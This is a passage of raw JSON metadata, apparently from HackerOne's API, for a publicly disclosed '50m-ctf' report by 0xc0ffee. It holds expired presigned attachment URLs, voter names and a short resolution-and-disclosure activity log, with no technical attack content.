ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8d2d1d11312064e7b15e6d33a215d134eeaa13eb7a3091e94fe302bbc1732e89","file_size":378741,"type":"image/png"},{"id":450900,"file_name":"congrats-ctf.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/900/e7b0e733a9a59d03501986219eab30e8411c018b/congrats-ctf.png?response-content-disposition=attachment%3B%20filename%3D%22congrats-ctf.png%22%3B%20filename%2A%3DUTF-8%27%27congrats-ctf.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150838Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=473aebdacaab7de787422345b5db26d193cd34cbd5c936f2ec84f30b440d4f8e","file_size":64271,"type":"image/png"}],"allow_singular_disclosure_at":"2019-05-08T15:57:07.795Z","allow_singular_disclosure_after":-76633890.48182322,"singular_disclosure_allowed":true,"vote_count":56,"voters":["nytr0gen","checkm50","ramsexy","ali","0xc0ffee","ewererewerwer","bl4ckh4ck5","aryan2808","eveeez","0xdeadbife","and 46 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4492839,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","automated_response":false,"created_at":"2019-04-05T18:33:06.178Z","updated_at":"2019-04-05T18:33:06.178Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"0xc0ffee","url":"/0xc0ffee"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509107,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-08T15:57:07.770Z","updated_at":"2019-04-08T15:57:07.770Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509108,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2019-04-08T15:57:12.556Z","updated_at":"2019-04-08T15:57:12.556Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}